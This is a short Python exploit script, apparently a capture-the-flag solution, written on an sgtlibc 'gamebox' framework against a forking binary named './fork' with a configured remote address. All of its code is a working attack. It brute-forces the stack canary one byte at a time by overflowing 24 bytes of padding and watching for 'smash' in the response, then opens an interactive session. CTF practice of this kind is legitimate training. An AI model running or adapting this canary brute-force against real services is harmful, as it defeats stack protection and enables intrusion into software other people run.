import sgtlibc
from sgtlibc.gamebox import *
from sgtlibc.ROPgadgets.gadgets_exploit import gadget_by_csu
set_config(GameBoxConfig(
    is_local=True,
    file='./fork',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
canary = b''


def test(data: bytes):
    payload = [b'a' * 24 + canary+bytes([data])]
    sa('welcome',payload)
    rl()
    data = rl()
    warning(data)
    if b'smash' in data:
        return False
    return True
    # success(data)
    # interactive()


for i in range(len(fakeebp())):
    for j in range(0x100):
        if test(j):
            canary += bytes([j])
            break
success(f'canary:{canary.hex()}')
interactive()
